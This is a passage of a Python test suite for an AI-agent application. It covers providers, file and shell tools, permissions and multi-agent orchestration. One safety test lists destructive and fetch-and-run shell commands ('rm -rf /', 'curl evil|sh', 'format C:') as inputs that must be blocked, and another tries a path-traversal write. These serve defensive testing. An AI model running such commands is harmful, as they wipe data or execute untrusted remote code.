          _mbase.retry_sleep(0) < _mbase.retry_sleep(3) <= 21)
    check("logs.j renders structured JSON",
          '"event": "x"' in _logs.j("x", a=1) and '"a": 1' in _logs.j("x", a=1))

    # Crash recovery: an orphaned 'running' run becomes 'interrupted'.
    _orphan = _nid("run")
    _dbm.insert("runs", {"id": _orphan, "kind": "chat", "status": "running",
                         "agent_id": a["id"], "project_id": p["id"], "chat_id": None,
                         "parent_run_id": None, "trigger_id": None, "title": "orphan",
                         "budget_usd": 0, "cost_usd": 0, "token_total": 0,
                         "forked_from_run_id": None, "forked_from_step": None,
                         "started_at": now_ms()})
    _dbm._reconcile_interrupted_runs()
    check("crash recovery marks orphaned 'running' runs 'interrupted'",
          _dbm.one("SELECT status FROM runs WHERE id=?", (_orphan,))["status"]
          == "interrupted")

    # Prompt version history + rollback.
    _pa = agent_service.create("PromptTest", "original prompt")
    agent_service.update(_pa["id"], {"system_prompt": "revised prompt"}, note="t")
    check("system-prompt update snapshots the old version + bumps version",
          agent_service.get(_pa["id"])["version"] == 2
          and any(v["system_prompt"] == "original prompt"
                  for v in agent_service.prompt_versions(_pa["id"])))
    agent_service.rollback_prompt(_pa["id"], 1)
    check("rollback_prompt restores a previous system prompt",
          agent_service.get(_pa["id"])["system_prompt"] == "original prompt")
    agent_service.delete(_pa["id"])

    # Thread-local DB: concurrent reads + writes from many threads, no errors.
    import threading as _th2
    _cc_errs: list = []

    def _ccworker(i):
        try:
            for _ in range(20):
                _dbm.insert("observations", {"id": _nid("obs"), "kind": "cctest",
                            "project_id": p["id"], "signature": str(i),
                            "data_json": "{}", "created_at": now_ms()})
                _dbm.all("SELECT COUNT(*) FROM observations")
        except Exception as e:
            _cc_errs.append(repr(e))
    _ccts = [_th2.Thread(target=_ccworker, args=(i,)) for i in range(4)]
    for t in _ccts:
        t.start()
    for t in _ccts:
        t.join()
    check("thread-local DB: 4 threads concurrent read+write, no errors",
          not _cc_errs
          and _dbm.one("SELECT COUNT(*) n FROM observations WHERE kind='cctest'")["n"]
          == 80)

    # ── v2.3.0: bounded RunExecutor + vectorised retrieval ────────────────────
    from aria2.runtime import executor as _ex
    _hits: list = []
    _futs = [_ex.submit(lambda i=i: _hits.append(i)) for i in range(10)]
    for f in _futs:
        f.result(timeout=5)
    check("RunExecutor runs all submitted top-level runs through the pool",
          sorted(_hits) == list(range(10)) and _ex.inflight() >= 0)

    from aria2.models import embeddings as _emb
    _q = _emb.embed("alpha beta gamma")
    _blobs = [_emb.embed(t) for t in
              ["alpha beta", "totally different content here", "gamma alpha beta"]]
    _np_scores = _emb.score_batch(_q, _blobs)
    _py_scores = [_emb.cosine(_emb.unpack(_q), _emb.unpack(b)) for b in _blobs]
    check("score_batch matches the pure-Python cosine loop (vectorised parity)",
          len(_np_scores) == 3
          and all(abs(a - b) < 1e-4 for a, b in zip(_np_scores, _py_scores))
          and _np_scores[2] > _np_scores[1])
    check("score_batch scores 0 on a dimension mismatch (mixed providers)",
          _emb.score_batch(_q, [b"\x00\x00\x00\x00"])[0] == 0.0)

    config.set_key("telegram_allowlist", [])  # reset

    # ── Browser tools + outbound notify tool ──────────────────────────────────
    from aria2.runtime.tools.browser_tools import make_browser_tools
    bts = {t.name: t for t in make_browser_tools()}
    check("browser tools exist", {"fetch_url", "web_search", "open_url"} <= set(bts))
    fetched = _fetch_via_server(bts["fetch_url"])
    check("fetch_url returns stripped page text", "hello-from-page" in str(fetched.get("text", "")))
    ts_msg, _ = build_toolset(base_dir=".", memory_scope="none", memory_scope_id="",
                              project_id=p["id"], include_shell=False,
                              settings={"delegation_enabled": False, "mcp_enabled": False,
                                        "messaging_enabled": True, "telegram_bot_token": "x"})
    check("notify_user tool present when messaging configured", "notify_user" in ts_msg.names())

    # ── TTS safe when disabled ────────────────────────────────────────────────
    from aria2.services import tts_service
    config.set_key("tts_enabled", False)
    tts_service.speak("this should be a no-op")  # must not raise
    check("tts speak is a safe no-op when disabled", True)

    # ── Heartbeat run_once ────────────────────────────────────────────────────
    hb = _heartbeat_once(p, a)
    check("heartbeat run_once produces a result", "text" in hb)

    # ── OpenAI OAuth token handling ───────────────────────────────────────────
    from aria2.services import openai_auth
    check("ensure_token empty in apikey mode",
          openai_auth.ensure_token({"openai_auth_mode": "apikey"}) == "")
    import time as _t
    valid = openai_auth.ensure_token({
        "openai_auth_mode": "oauth", "openai_oauth_token": "tok-1",
        "openai_oauth_expires": int(_t.time()) + 9999})
    check("ensure_token returns a still-valid token", valid == "tok-1")
    refreshed = _openai_oauth_refresh(openai_auth)
    check("ensure_token refreshes an expired OAuth token", refreshed == "fresh-token")

    # ── Discord output channels ───────────────────────────────────────────────
    from aria2.services import messaging_service
    hits, base = _discord_server()
    try:
        config.set_key("discord_webhook_url", f"{base}/default")
        config.set_key("discord_channels", [{"name": "alerts", "url": f"{base}/alerts"}])
        d1 = messaging_service.post_discord("hello default")
        d2 = messaging_service.post_discord("to alerts", channel="alerts")
        d3 = messaging_service.post_discord("nope", channel="missing")
        check("post_discord posts to the default webhook", d1.get("sent"))
        check("post_discord routes to a named channel", d2.get("sent")
              and any(p["path"] == "/alerts" for p in hits))
        check("post_discord errors on unknown channel", "error" in d3)
        ts_d, _ = build_toolset(base_dir=".", memory_scope="none", memory_scope_id="",
                                project_id=p["id"], include_shell=False,
                                settings={"delegation_enabled": False, "mcp_enabled": False,
                                          "discord_webhook_url": f"{base}/default"})
        check("post_discord tool present when configured", "post_discord" in ts_d.names())
        # Proactive prompting: a run with notify/discord tools gets a reach note.
        sys_note = _capture_system({"discord_webhook_url": f"{base}/default"}, p, a)
        check("system prompt advertises proactive reach (post_discord)",
              "post_discord" in sys_note)
        # ...but NOT when tools are off (weak local model) — otherwise the model
        # is told to call tools it can't invoke and emits fake tool-call text.
        sys_notools = _capture_system({"discord_webhook_url": f"{base}/default"},
                                      p, a, supports_tools=False)
        check("no tool advertising in the system prompt when tools are off",
              "post_discord" not in sys_notools)
    finally:
        config.set_key("discord_webhook_url", "")
        config.set_key("discord_channels", [])

    # ── Discord inbound bridge (safe when disabled / lib absent) ──────────────
    messaging_service.discord_bridge.start()  # must not raise even if off
    messaging_service.discord_bridge.stop()
    check("discord inbound bridge start/stop is safe when disabled", True)

    # ── Grok (xAI) provider: API + OAuth ──────────────────────────────────────
    from aria2.models import registry as model_registry
    gp, gmodel = model_registry.for_settings(
        {"provider": "grok", "grok_api_key": "k", "grok_model": "grok-2-latest"})
    check("grok provider routes with the right model + name",
          gp.name == "grok" and gmodel == "grok-2-latest")
    caps = gp.capabilities("grok-2-latest")
    check("grok capabilities support tools + large context",
          caps.supports_tools and caps.context_window >= 100_000)
    from aria2.services import provider_auth
    check("grok ensure_token empty in apikey mode",
          provider_auth.ensure_token({"grok_auth_mode": "apikey"}, "grok") == "")
    grok_ref = _provider_oauth_refresh(provider_auth, "grok")
    check("grok ensure_token refreshes an expired OAuth token", grok_ref == "fresh-token")

    # ── Gemini (Google) provider ──────────────────────────────────────────────
    gem, gem_model = model_registry.for_settings(
        {"provider": "gemini", "gemini_api_key": "k", "gemini_model": "gemini-2.0-flash"})
    gcaps = gem.capabilities("gemini-2.0-flash")
    check("gemini provider routes with the right model + name",
          gem.name == "gemini" and gem_model == "gemini-2.0-flash")
    check("gemini capabilities: tools + huge context",
          gcaps.supports_tools and gcaps.context_window >= 1_000_000)

    # ── Generic OpenAI-compatible provider (LM Studio / vLLM / OpenRouter / …) ──
    from aria2.models.openai_compat_provider import (
        OpenAICompatProvider, _normalize_base_url)
    check("oai-compat normalizes a bare host to an OpenAI /v1 base",
          _normalize_base_url("http://localhost:1234") == "http://localhost:1234/v1"
          and _normalize_base_url("https://openrouter.ai/api/v1/") == "https://openrouter.ai/api/v1")
    ocp = OpenAICompatProvider("http://localhost:1234", api_key="")
    check("oai-compat provider has the right name", ocp.name == "openai_compat")
    config.set_key("oai_compat_tool_mode", "never")
    check("oai-compat tool_mode=never disables tools (graceful fallback)",
          ocp.capabilities("any-model").supports_tools is False)
    config.set_key("oai_compat_tool_mode", "auto")
    config.set_key("oai_compat_num_ctx", 16384)
    _occ = ocp.capabilities("any-model")
    check("oai-compat auto enables tools + honours num_ctx",
          _occ.supports_tools is True and _occ.context_window == 16384)
    config.set_key("oai_compat_num_ctx", 8192)
    oc_prov, oc_model = model_registry.for_settings(
        {"provider": "openai_compat", "oai_compat_base_url": "http://localhost:1234",
         "oai_compat_model": "local-model"})
    check("registry routes openai_compat with base url + model",
          oc_prov.name == "openai_compat" and oc_model == "local-model")
    check("provider_configured: openai_compat needs a base url + model",
          config.provider_configured({"provider": "openai_compat",
                                      "oai_compat_base_url": "http://x/v1",
                                      "oai_compat_model": "m"})
          and not config.provider_configured({"provider": "openai_compat",
                                              "oai_compat_base_url": "",
                                              "oai_compat_model": ""}))

    # ── Update manifest generator ─────────────────────────────────────────────
    import subprocess
    import sys
    import tempfile
    from pathlib import Path
    out = Path(tempfile.mkdtemp()) / "latest.json"
    subprocess.run([sys.executable, "scripts/make_manifest.py", "--version", "9.9.9",
                    "--url", "http://x/app.zip", "--notes", "t", "--out", str(out)],
                   cwd=str(Path(__file__).resolve().parents[1]), capture_output=True)
    man = json.loads(out.read_text())
    check("manifest generator writes version + url",
          man["version"] == "9.9.9" and man["url"] == "http://x/app.zip")
    # --zip makes the manifest carry a sha256 the in-app updater verifies.
    import hashlib as _hl0
    _zf = Path(tempfile.mkdtemp()) / "ARIA2-9.9.9.zip"
    _zf.write_bytes(b"pretend-zip-bytes")
    out2 = Path(tempfile.mkdtemp()) / "latest.json"
    subprocess.run([sys.executable, "scripts/make_manifest.py", "--version", "9.9.9",
                    "--url", "http://x/app.zip", "--zip", str(_zf), "--out", str(out2)],
                   cwd=str(Path(__file__).resolve().parents[1]), capture_output=True)
    man2 = json.loads(out2.read_text())
    check("manifest generator embeds the zip sha256",
          man2.get("sha256") == _hl0.sha256(b"pretend-zip-bytes").hexdigest())

    # ── Hardening cycle: perf + security regression tests ─────────────────────
    pchat = chat_service.create_chat(p["id"], agent_id=a["id"])
    for i in range(8):
        chat_service._persist_message(pchat["id"], "user", [{"type": "text", "text": f"m{i}"}])
    paged = chat_service.list_messages(pchat["id"], limit=3)
    check("message pagination returns only the most recent N (chronological)",
          len(paged) == 3 and _blocks_text(paged[-1]["content"]) == "m7")

    from aria2.runtime.tools.file_tools import make_file_tools
    ftools = {t.name: t for t in make_file_tools(work)}  # `work` = a real temp dir
    esc = ftools["write_file"].fn(path="../escape.txt", content="x")
    check("file write rejects path traversal outside the project folder",
          "error" in esc)

    # edit_file: precise find/replace — present + unique unless replace_all.
    ftools["write_file"].fn(path="edit.txt", content="alpha beta alpha\n")
    _e1 = ftools["edit_file"].fn(path="edit.txt", old_string="beta", new_string="GAMMA")
    check("edit_file replaces a unique substring",
          _e1.get("replacements") == 1
          and ftools["read_file"].fn(path="edit.txt")["content"] == "alpha GAMMA alpha\n")
    _e2 = ftools["edit_file"].fn(path="edit.txt", old_string="alpha", new_string="A")
    check("edit_file refuses a non-unique match unless replace_all",
          "error" in _e2 and "unique" in _e2["error"])
    _e3 = ftools["edit_file"].fn(path="edit.txt", old_string="alpha",
                                 new_string="A", replace_all=True)
    check("edit_file replace_all replaces every occurrence",
          _e3.get("replacements") == 2
          and ftools["read_file"].fn(path="edit.txt")["content"] == "A GAMMA A\n")
    check("edit_file errors clearly when old_string is absent",
          "not found" in ftools["edit_file"].fn(
              path="edit.txt", old_string="nope", new_string="x").get("error", ""))
    from aria2.services import chat_service as _csmode
    check("edit_file is classified as a write tool (auto-allowed in accept/auto)",
          "edit_file" in _csmode._WRITE_TOOLS
          and _csmode._MODE_POLICIES["accept"].get("edit_file") == "allow")

    # run_python executes via a temp file (no shell), so code containing quotes
    # and backslashes runs correctly — the old `python -c "<...>"` path mangled
    # these on Windows cmd.exe.
    from aria2.runtime.tools import sandbox as _sandbox
    _pyres = _sandbox.run_python('print("quotes \\" and back\\\\slash")')
    check("run_python runs snippets with quotes/backslashes correctly",
          _pyres.get("exit_code") == 0
          and 'quotes " and back\\slash' in _pyres.get("stdout", ""))

    # Reliability: child output is decoded as UTF-8 (not the Windows locale codec),
    # so non-ASCII output neither crashes nor mojibakes.
    import sys as _sys2
    _uni = _sandbox.run_python("print('caf\\u00e9 \\u5317')")
    check("run_python decodes non-ASCII (UTF-8) output without crashing",
          _uni.get("exit_code") == 0 and "café 北" in _uni.get("stdout", ""))
    # In a normal (unfrozen) install the interpreter is sys.executable; the frozen
    # app falls back to a real python on PATH (so run_python doesn't relaunch ARIA).
    check("_python_exe resolves a real interpreter (sys.executable unfrozen)",
          _sandbox._python_exe() == _sys2.executable)

    # Reliability: read_file/list_dir signal truncation instead of silently
    # returning partial data the model would treat as complete.
    _big = ftools["write_file"].fn(path="big.txt", content="x" * 150_000)
    _rbig = ftools["read_file"].fn(path="big.txt")
    check("read_file flags truncation + reports total size",
          _rbig.get("truncated") is True and _rbig.get("total_chars") == 150_000
          and len(_rbig.get("content", "")) == 100_000)
    _rsmall = ftools["read_file"].fn(path="big.txt")  # sanity: small read has no flag
    check("read_file on a directory returns a clear error (not a crash)",
          "directory" in str(ftools["read_file"].fn(path=".").get("error", "")).lower())

    # web_search unwraps DuckDuckGo's redirect so callers get clean target URLs.
    from aria2.runtime.tools.browser_tools import _clean_ddg
    check("web_search cleans DuckDuckGo redirect URLs to the real destination",
          _clean_ddg("//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fp%3Fa%3D1")
          == "https://example.com/p?a=1"
          and _clean_ddg("https://plain.example/x") == "https://plain.example/x")

    # Bus unsubscribe (the mechanism ChatView.destroy() uses so destroyed views
    # stop receiving run.* events — fixes the rebuild_views handler leak).
    from aria2.core.events import EventBus as _EB
    _eb = _EB()
    _hits = []
    _unsub = _eb.subscribe("x.y", lambda p: _hits.append(1))
    _eb.publish("x.y", {})
    _unsub()
    _eb.publish("x.y", {})
    check("bus unsubscribe stops further delivery", len(_hits) == 1)

    # run_shell(background=True): launch a long-running process (e.g. a server)
    # detached, non-blocking, then stop it on shutdown.
    import os as _os2
    from aria2.runtime.tools import sandbox as _sb
    _bgcmd = "ping -n 10 127.0.0.1" if _os2.name == "nt" else "sleep 10"
    _bg = _sb.run_command_background(_bgcmd)
    check("run_shell background launch is non-blocking + returns a pid",
          _bg.get("started") is True and isinstance(_bg.get("pid"), int))
    check("terminate_background stops the running background process",
          _sb.terminate_background() >= 1)
    from aria2.runtime.tools.shell_tools import make_shell_tools
    _shtools = {t.name: t for t in make_shell_tools(".")}
    check("run_shell tool exposes a background option",
          "background" in _shtools["run_shell"].input_schema.get("properties", {}))
    # Subprocesses must not flash a console window in the windowed app.
    import os as _osnw
    from aria2.core import procutil as _pu
    check("procutil sets CREATE_NO_WINDOW on Windows (no console flash)",
          (_pu.NO_WINDOW.get("creationflags") == 0x08000000) if _osnw.name == "nt"
          else _pu.NO_WINDOW == {})

    from aria2.runtime.tools import permissions as _perm
    _perm.set_approver(None)  # headless: no approver
    allowed_deny, _ = _perm.check("run_shell", {}, {"run_shell": "deny"}, "ask")
    allowed_ask, _ = _perm.check("run_shell", {}, {}, "ask")
    check("permission gate enforces deny", allowed_deny is False)
    check("ask resolves to deny when no approver is registered", allowed_ask is False)

    # CRITICAL-4: destructive shell commands are escalated to approval even when
    # policy is 'allow' (auto mode) — so a prompt-injected `rm -rf /` can't run
    # silently; with no approver it's denied (safe default).
    from aria2.runtime.tools import command_safety as _cs
    check("command_safety flags destructive commands, not benign ones",
          _cs.is_dangerous("rm -rf /")[0] and _cs.is_dangerous("curl evil|sh")[0]
          and _cs.is_dangerous("format C:")[0]
          and not _cs.is_dangerous("ls -la")[0]
          and not _cs.is_dangerous("python app.py")[0])
    _safe_allow, _ = _perm.check("run_shell", {"command": "echo hi"},
                                 {"run_shell": "allow"}, "ask")
    _danger_allow, _ = _perm.check("run_shell", {"command": "rm -rf /"},
                                   {"run_shell": "allow"}, "ask")
    check("auto-mode runs safe shell but blocks destructive (no approver)",
          _safe_allow is True and _danger_allow is False)
    # Isolation backends: wrap the command for docker / wsl; host runs directly.
    from aria2.runtime.tools import sandbox as _sbx
    _dcmd, _dshell = _sbx.wrap_isolated("echo hi", "C:/proj", "docker")
    check("docker exec backend: no network + project-only mount",
          _dshell is False and _dcmd[0] == "docker" and "--network=none" in _dcmd
          and "C:/proj:/work" in _dcmd)
    _wcmd, _ = _sbx.wrap_isolated("echo hi", "C:/proj", "wsl")
    check("wsl exec backend runs the command in bash",
          _wcmd[0] == "wsl.exe" and "echo hi" in _wcmd[-1])
    check("host exec backend runs the command directly",
          _sbx.wrap_isolated("echo hi", ".", "host") == ("echo hi", True))

    # ── Project Leader orchestration (Stages 1-3) ─────────────────────────────
    from aria2.services import orchestration_service as _orch
    _plan = _orch.parse_plan(
        'sure ```json\n[{"id":1,"title":"A","role":"coder"},'
        '{"id":2,"title":"B","depends_on":[1]}]\n``` done')
    check("parse_plan reads a JSON task array (fences + prose); junk -> []",
          [t["title"] for t in _plan] == ["A", "B"]
          and _plan[1]["depends_on"] == [1]
          and _orch.parse_plan("not json at all") == [])
    _td = _orch.topo_order([
        {"ordinal": 2, "title": "B", "depends_on": [1], "role": "x"},
        {"ordinal": 1, "title": "A", "depends_on": [], "role": "x"}])
    check("topo_order sorts tasks into dependency order",
          [t["ordinal"] for t in _td] == [1, 2])
    check("waves groups tasks into parallel dependency levels",
          [[t["ordinal"] for t in lvl] for lvl in _orch.waves([
              {"ordinal": 1, "depends_on": [], "role": "x", "title": "a"},
              {"ordinal": 2, "depends_on": [], "role": "x", "title": "b"},
              {"ordinal": 3, "depends_on": [1, 2], "role": "x", "title": "c"}])]
          == [[1, 2], [3]])
    check("role_to_agent maps specialist roles to built-in agents",
          _orch.role_to_agent("researcher") == "researcher"
          and _orch.role_to_agent("coder") == "coder"
          and _orch.role_to_agent("reviewer") == "reviewer"
          and _orch.role_to_agent("tester") == "tester"
          and _orch.role_to_agent("unknown") == "assistant")
    check("reviewer + tester are seeded as built-in agents",
          (agent_service.get("reviewer") or {}).get("id") == "reviewer"
          and (agent_service.get("tester") or {}).get("id") == "tester")

    # Full leader run with a stubbed planner + a fake provider for specialists/merge.
    from aria2.models import registry as _oreg

    class _OProv:
        name = "fake"

        def capabilities(self, m):
            from aria2.models.base import Capabilities
            return Capabilities(supports_tools=False, supports_caching=False)

        def count_tokens(self, t):
            return len(t) // 4

        def stream(self, model, system, messages, tools=None, max_tokens=4096,
                   temperature=1.0, cache=True):
            from aria2.models.base import StreamEvent
            yield StreamEvent(type="text", text="ok output")
            yield StreamEvent(type="usage", usage={"input": 3, "output": 2})
            yield StreamEvent(type="done", stop_reason="end_turn")

    _orig_plan, _orig_reg = _orch._plan, _oreg.for_settings
    # 1 & 2 are independent (run in parallel); 3 depends on both. 1 is code → reviewed.
    _orch._plan = lambda *aa, **kk: [
        {"ordinal": 1, "title": "Write code", "description": "do one",
         "role": "coder", "depends_on": []},
        {"ordinal": 2, "title": "Research", "description": "do two",
         "role": "researcher", "depends_on": []},
        {"ordinal": 3, "title": "Summarise", "description": "do three",
         "role": "writer", "depends_on": [1, 2]}]
    _oreg.for_settings = lambda s, o=None: (_OProv(), "fake")
    try:
        _lrid = _nid("run")
        _dbm.insert("runs", {"id": _lrid, "kind": "leader", "status": "running",
                     "agent_id": a["id"], "project_id": p["id"], "chat_id": None,
                     "parent_run_id": None, "trigger_id": None, "title": "team",
                     "budget_usd": 0, "cost_usd": 0, "token_total": 0,
                     "forked_from_run_id": None, "forked_from_step": None,
                     "started_at": now_ms()})
        _orch._orchestrate("build x", p, a, None, _lrid)
        _ltasks = _orch.tasks_for(_lrid)
        _byord = {t["ordinal"]: t for t in _ltasks}
        check("Project Leader runs a parallel wave + dependent step, all done",
              len(_ltasks) == 3
              and all(t["status"] == "done" for t in _ltasks)
              and _byord[3]["run_id"]
              and _dbm.one("SELECT status FROM runs WHERE id=?",
                           (_lrid,))["status"] == "done")
        check("auto-review gate appends a reviewer critique to code tasks",
              "— Reviewer —" in (_byord[1]["output"] or "")
              and "— Reviewer —" not in (_byord[2]["output"] or ""))
    finally:
        _orch._plan, _oreg.for_settings = _orig_plan, _orig_reg

    # Stage 3: deliverable contracts + review verdicts (pure functions).
    check("validate_deliverable enforces non-empty + keywords + json format",
          _orch.validate_deliverable("", {})[0] is False
          and _orch.validate_deliverable("hello world", {"expects": ["world"]})[0] is True
          and _orch.validate_deliverable("hello", {"expects": ["world"]})[0] is False
          and _orch.validate_deliverable('{"a":1}', {"format": "json"})[0] is True
          and _orch.validate_deliverable("nope", {"format": "json"})[0] is False)
    check("review_verdict reads the APPROVE / REVISE lead word",
          _orch.review_verdict("REVISE: add tests") == "revise"
          and _orch.review_verdict("APPROVE, looks good") == "approve"
          and _orch.review_verdict("") == "approve")
    check("parse_plan captures expects + json format into a contract",
          _orch.parse_plan('[{"id":1,"title":"T","expects":["foo"],"format":"json"}]')
          [0]["contract"] == {"expects": ["foo"], "format": "json", "schema": {}})

    # Stage 3: revision loop (reviewer rejects once, then approves → coder re-runs)
    # and honest contract failure (a deliverable missing a required keyword fails).
    from aria2.core import config as _cfg3
    _orig_review, _orig_reg3 = _orch._review, _oreg.for_settings
    _oreg.for_settings = lambda s, o=None: (_OProv(), "fake")
    _rev_calls = []

    def _fake_review(task, output, project, settings):
        _rev_calls.append(1)
        return ("revise", "add a docstring") if len(_rev_calls) == 1 else ("approve", "good")
    _orch._review = _fake_review
    try:
        _lrid3 = _nid("run")
        _dbm.insert("runs", {"id": _lrid3, "kind": "leader", "status": "running",
                     "agent_id": a["id"], "project_id": p["id"], "chat_id": None,
                     "parent_run_id": None, "trigger_id": None, "title": "team",
                     "budget_usd": 0, "cost_usd": 0, "token_total": 0,
                     "forked_from_run_id": None, "forked_from_step": None,
                     "started_at": now_ms()})
        _ctid = _nid("task")
        _dbm.insert("tasks", {"id": _ctid, "leader_run_id": _lrid3, "ordinal": 1,
                     "title": "code", "description": "x", "role": "coder",
                     "agent_id": "coder", "depends_on": "[]", "contract": "{}",
                     "status": "pending", "run_id": None, "output": None,
                     "created_at": now_ms(), "updated_at": now_ms()})
        _ctask = {"id": _ctid, "ordinal": 1, "title": "code", "description": "x",
                  "role": "coder", "depends_on": [], "contract": {}}
        _o, _out, _ok = _orch._run_one(_ctask, {}, p, _cfg3.load(), _lrid3, None, True)
        check("revision loop re-runs a coder task until the reviewer approves",
              _ok is True and len(_rev_calls) == 2
              and "— Reviewer —" in _out and "good" in _out)

        _ftid = _nid("task")
        _dbm.insert("tasks", {"id": _ftid, "leader_run_id": _lrid3, "ordinal": 2,
                     "title": "write", "description": "y", "role": "writer",
                     "agent_id": "writer", "depends_on": "[]",
                     "contract": '{"expects": ["UNICORN"]}', "status": "pending",
                     "run_id": None, "output": None,
                     "created_at": now_ms(), "updated_at": now_ms()})
        _ftask = {"id": _ftid, "ordinal": 2, "title": "write", "description": "y",
                  "role": "writer", "depends_on": [], "contract": {"expects": ["UNICORN"]}}
        _fo, _fout, _fok = _orch._run_one(_ftask, {}, p, _cfg3.load(), _lrid3, None, True)
        check("a deliverable that fails its contract fails the task honestly",
              _fok is False
              and _dbm.one("SELECT status FROM tasks WHERE id=?",
                           (_ftid,))["status"] == "failed")
    finally:
        _orch._review, _oreg.for_settings = _orig_review, _orig_reg3

    # Stage 3: plan-approval checkpoint — pending_for_chat finds it, cancel discards.
    _achat, _arun = _nid("chat"), _nid("run")
    _dbm.insert("runs", {"id": _arun, "kind": "leader", "status": "awaiting_approval",
                 "agent_id": a["id"], "project_id": p["id"], "chat_id": _achat,
                 "parent_run_id": None, "trigger_id": None, "title": "Team: do it",
                 "budget_usd": 0, "cost_usd": 0, "token_total": 0,
                 "forked_from_run_id": None, "forked_from_step": None,
                 "started_at": now_ms()})
    check("pending_for_chat finds a plan awaiting approval; cancel discards it",
          (_orch.pending_for_chat(_achat) or {}).get("id") == _arun
          and _orch.cancel(_achat) is True
          and _dbm.one("SELECT status FROM runs WHERE id=?",
                       (_arun,))["status"] == "cancelled"
          and _orch.pending_for_chat(_achat) is None)

    # ── Project Leader Stage 4: JSON-Schema, risk-aware approval, telemetry ────
    _schema = {"type": "object", "required": ["name", "age"],
               "properties": {"name": {"type": "string", "minLength": 1},
                              "age": {"type": "integer", "minimum": 0}}}
    check("validate_schema enforces type/required/properties/min",
          _orch.validate_schema({"name": "Ada", "age": 36}, _schema) == ""
          and _orch.validate_schema({"name": "Ada"}, _schema) != ""          # missing
          and _orch.validate_schema({"name": "", "age": 36}, _schema) != ""  # minLength
          and _orch.validate_schema({"name": "Ada", "age": -1}, _schema) != ""  # minimum
          and _orch.validate_schema({"name": "Ada", "age": "x"}, _schema) != "")  # type
    check("validate_schema rejects a boolean where a number is required",
          _orch.validate_schema(True, {"type": "integer"}) != "")
    check("validate_deliverable runs a contract's JSON-Schema (fenced JSON ok)",
          _orch.validate_deliverable('```json\n{"name":"Ada","age":36}\n```',
                                     {"schema": _schema})[0] is True
          and _orch.validate_deliverable('{"name":"Ada"}', {"schema": _schema})[0] is False
          and _orch.validate_deliverable("not json", {"schema": _schema})[0] is False)
    _rp = _orch.parse_plan(
        '[{"id":1,"title":"wipe","role":"coder","risk":"high",'
        '"schema":{"type":"object"}}]')[0]
    check("parse_plan captures risk + JSON-Schema into the task",
          _rp["risk"] == "high" and _rp["contract"]["schema"] == {"type": "object"})
    check("plan_requires_approval escalates when a step is high-risk",
          _orch.plan_requires_approval([{"risk": "high"}], {}) is True
          and _orch.plan_requires_approval([{"risk": ""}], {}) is False
          and _orch.plan_requires_approval(
              [{"risk": ""}], {"orchestration_plan_approval": True}) is True)

    # Revision telemetry: the revisions column is persisted on the task row.
    _orig_review4, _orig_reg4 = _orch._review, _oreg.for_settings
    _oreg.for_settings = lambda s, o=None: (_OProv(), "fake")
    _rc4 = []

    def _fake_review4(task, output, project, settings):
        _rc4.append(1)
        return ("revise", "tighten it") if len(_rc4) == 1 else ("approve", "ok")
    _orch._review = _fake_review4
    try:
        _lr4 = _nid("run")
        _dbm.insert("runs", {"id": _lr4, "kind": "leader", "status": "running",
                     "agent_id": a["id"], "project_id": p["id"], "chat_id": None,
                     "parent_run_id": None, "trigger_id": None, "title": "team",
                     "budget_usd": 0, "cost_usd": 0, "token_total": 0,
                     "forked_from_run_id": None, "forked_from_step": None,
                     "started_at": now_ms()})
        _t4 = _nid("task")
        _dbm.insert("tasks", {"id": _t4, "leader_run_id": _lr4, "ordinal": 1,
                     "title": "code", "description": "x", "role": "coder",
                     "agent_id": "coder", "depends_on": "[]", "contract": "{}",
                     "risk": "", "revisions": 0, "status": "pending", "run_id": None,
                     "output": None, "created_at": now_ms(), "updated_at": now_ms()})
        _td4 = {"id": _t4, "ordinal": 1, "title": "code", "description": "x",
                "role": "coder", "depends_on": [], "contract": {}}
        _orch._run_one(_td4, {}, p, _cfg3.load(), _lr4, None, True)
        check("revision count is persisted to the task's revisions column",
              _dbm.one("SELECT revisions FROM tasks WHERE id=?", (_t4,))["revisions"] == 1)
    finally:
        _orch._review, _oreg.for_settings = _orig_review4, _orig_reg4

    # ── Run engine: honest cancellation + resilient step serialisation ────────
    from aria2.runtime import run_engine as _re
    from aria2.runtime.run_engine import RunEngine as _RE, RunRequest as _RReq
    from aria2.models.base import Capabilities as _Caps, StreamEvent as _SEv
    _crid = _nid("run")

    class _CancelMidProv:
        name = "fake"

        def capabilities(self, m):
            return _Caps(supports_tools=False, supports_caching=False)

        def count_tokens(self, t):
            return max(1, len(t) // 4)

        def stream(self, model, system, messages, tools=None, max_tokens=4096,
                   temperature=1.0, cache=True):
            yield _SEv(type="text", text="partial answer")
            _re._cancel[_crid].set()  # simulate the user pressing Stop mid-stream
            yield _SEv(type="text", text=" (should be dropped)")
            yield _SEv(type="usage", usage={"input": 2, "output": 2})
            yield _SEv(type="done", stop_reason="end_turn")

    _save_reg = _oreg.for_settings
    _oreg.for_settings = lambda s, o=None: (_CancelMidProv(), "fake")
    try:
        _cres = _RE(_cfg3.load()).execute(_RReq(
            agent=a, project=p,
            messages=[{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
            kind="chat", run_id=_crid))
        check("cancelling mid-stream finalises as 'cancelled' (not 'done'), keeps text",
              _cres.status == "cancelled" and "partial answer" in _cres.text
              and _dbm.one("SELECT status FROM runs WHERE id=?",
                           (_crid,))["status"] == "cancelled")
        _ser_ok = True
        try:
            _RE(_cfg3.load())._record_step(_crid, 77, "tool", tool_name="x",
                                           output={"weird": object()})
        except Exception:
            _ser_ok = False
        check("run-step serialisation tolerates non-JSON tool output (default=str)",
              _ser_ok is True)
    finally:
        _oreg.for_settings = _save_reg

    # A mid-stream provider error keeps the partial answer that already streamed
    # (completing the partial-stream recovery story; cancel was handled in 2.12.0).
    class _ErrMidProv:
        name = "fake"

        def capabilities(self, m):
            return _Caps(supports_tools=False, supports_caching=False)

        def count_tokens(self, t):
            return 1

        def stream(self, model, system, messages, tools=None, max_tokens=4096,
                   temperature=1.0, cache=True):
            yield _SEv(type="text", text="here is the answer so")
            yield _SEv(type="error", error="connection reset")

    _save_reg2 = _oreg.for_settings
    _oreg.for_settings = lambda s, o=None: (_ErrMidProv(), "fake")
    try:
        _eres = _RE(_cfg3.load()).execute(_RReq(
            agent=a, project=p,
            messages=[{"role": "user", "content": [{"type": "text", "text": "q"}]}],
            kind="chat", run_id=_nid("run")))
        _etext = " ".join(b.get("text", "") for b in _eres.assistant_content
                          if b.get("type") == "text")
        check("a mid-stream provider error preserves the partial answer (not lost)",
              _eres.status == "failed" and "here is the answer so" in _etext
              and "interrupted" in _etext)
    finally:
        _oreg.for_settings = _save_reg2

